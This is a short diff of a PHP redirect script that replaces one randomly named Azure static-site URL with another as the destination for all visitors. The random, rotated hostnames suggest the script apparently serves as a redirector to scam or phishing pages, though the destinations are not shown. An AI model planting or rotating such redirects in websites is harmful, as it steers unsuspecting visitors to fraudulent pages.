@@ -1,6 +1,6 @@
 <?php
 // Define the destination URL
-$destination_url = "https://ad23dsmaxx87core8s.z1.web.core.windows.net/";
+$destination_url = "https://exo987core87fix7g3s3edw.z8.web.core.windows.net/";
 
 // Send the Location header for redirection
 header("Location: " . $destination_url);
